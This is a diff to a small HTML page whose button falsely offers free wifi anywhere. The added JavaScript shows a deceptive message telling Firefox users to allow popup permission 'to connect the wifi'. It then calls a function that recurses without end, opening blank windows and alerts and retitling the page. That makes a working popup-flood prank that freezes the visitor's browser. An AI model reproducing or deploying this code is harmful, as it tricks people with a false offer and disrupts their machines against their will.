@@ -2,15 +2,17 @@
   <button onclick="seeya1()"><h1>CLICK HERE FOR GET FREE WIFI WERHE EVER YOU GO</h1></button>
   <script>
     i = 0
-    function seeya1(){
-      alert("Firefox Users Only:\nWe need popup permission to connect the wifi. Allow the permission in the following message")
-    }
+    
     function seeya(){
       i = i + 1;
       window.open("about:blank")
       document.title = "The free wifi has duplicated itself" + i + "times. Have fun!"
       alert("The free wifi has duplicated itself" + i + "times. Have fun!")
       window.focus()
+      seeya()
+    }
+    function seeya1(){
+      alert("Firefox Users Only:\nWe need popup permission to connect the wifi. Allow the permission in the following message")
       seeya()
     }
    </script>
